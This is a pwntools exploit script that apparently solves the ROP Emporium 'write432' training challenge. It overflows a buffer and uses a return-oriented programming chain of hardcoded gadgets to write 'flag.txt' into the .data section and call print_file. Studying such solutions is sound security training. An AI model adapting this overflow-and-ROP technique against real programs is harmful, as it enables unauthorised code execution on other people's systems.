from pwn import *
import os

script_dir = os.path.dirname(os.path.realpath(__file__))
bin = os.path.join(script_dir, 'write432')

bin_elf = context.binary =  ELF(bin, checksec=False)
context.log_level = 'debug'

gdbscript = '''
init-pwndbg
break pwnme
continue
'''.format(**locals())

if args.GDB:  # Set GDBscript above
    io = gdb.debug(bin, gdbscript=gdbscript)
else:  # Run locally
    io = process()


# Found with GDB
offset = 44
pop_gadget_address = 0x080485aa
data_section_address = 0x0804a018
flag_str = b"flag"
txt_str = b".txt"
mov_gadget_address = 0x08048543
print_file_address = 0x080483d0

payload = flat(
    asm('nop')*offset, # a NOP sled is safer
    # round 1 move "flag"
    pop_gadget_address,
    data_section_address,
    flag_str,
    mov_gadget_address,
    # round 2 move .txt
    pop_gadget_address,
    data_section_address + 0x4,
    txt_str,
    mov_gadget_address,
    # return to print_file
    print_file_address,
    "BBBB",
    data_section_address
)

pprint(payload)

io.sendlineafter(b'>', payload)

io.interactive()
